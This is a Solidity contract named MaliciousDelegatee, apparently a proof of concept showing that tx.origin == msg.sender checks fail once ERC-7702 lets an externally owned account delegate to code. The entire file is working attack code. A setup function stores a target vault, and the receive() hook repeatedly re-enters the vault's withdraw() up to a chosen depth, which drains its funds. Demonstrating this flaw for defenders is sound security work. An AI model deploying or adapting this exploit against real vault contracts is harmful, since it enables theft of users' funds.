// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VulnerableVault} from "./VulnerableVault.sol";

/// @title MaliciousDelegatee
/// @notice When an EOA delegates to this contract, it gains reentrancy capabilities
/// @dev This demonstrates why tx.origin == msg.sender is broken post-ERC7702
contract MaliciousDelegatee {
    /// @notice Storage slot 0: tracks reentrancy count during attack
    /// @dev When EOA delegates here, this lives in the EOA's storage
    uint256 public attackCount;

    /// @notice Storage slot 1: target vault to attack
    VulnerableVault public targetVault;

    /// @notice Storage slot 2: maximum reentrancy depth
    uint256 public maxReenters;

    /// @notice Set up the attack parameters (called on the delegated EOA)
    function setupAttack(VulnerableVault _vault, uint256 _maxReenters) external {
        targetVault = _vault;
        maxReenters = _maxReenters;
        attackCount = 0;
    }

    /// @notice Initiate the attack by calling withdraw on the vault
    function attack() external {
        targetVault.withdraw();
    }

    receive() external payable {
        if (attackCount >= maxReenters) return;

        ++attackCount;
        targetVault.withdraw();
    }
}
